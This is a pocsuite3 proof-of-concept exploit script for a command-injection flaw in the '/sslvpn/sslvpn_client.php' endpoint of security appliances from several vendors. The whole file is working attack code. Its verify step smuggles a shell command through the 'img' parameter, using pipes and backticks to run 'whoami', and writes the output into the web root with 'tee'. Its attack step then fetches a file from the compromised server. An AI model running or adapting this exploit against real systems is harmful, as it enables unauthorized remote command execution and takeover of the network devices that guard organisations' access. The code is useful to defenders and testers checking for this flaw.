# -*- coding: utf-8 -*-
# 2023/12/7 11:59

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OrderedDict, OptString


class Multiple_vendors_RCE(POCBase):
    author = '炼金术师诸葛亮'
    createDate = '2023-12-7'
    name = 'Multiple-vendors-RCE'
    appName = 'Multiple-vendors-RCE'
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '多个产商安全产品存在命令执行，攻击者可通过此漏洞获取服务器权限。'  # 漏洞简要描述

    def _verify(self):
        result = {}
        path = "/sslvpn/sslvpn_client.php"  # 参数
        url = self.url + path
        payload = "?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls"  # payload
        r = requests.get(url + payload)
        print(r.text)
        # 验证成功输出相关信息
        if r and r.status_code == 200 and "whoami" in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Name'] = payload

        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/sslvpn/ceshi.php"
        url = self.url + path
        headers={
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'
        }

        r = requests.get(url,headers=headers)
        if r and r.status_code == 200 and "www" in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Resp'] = r.text

        return self.parse_output(result)

register_poc(Multiple_vendors_RCE)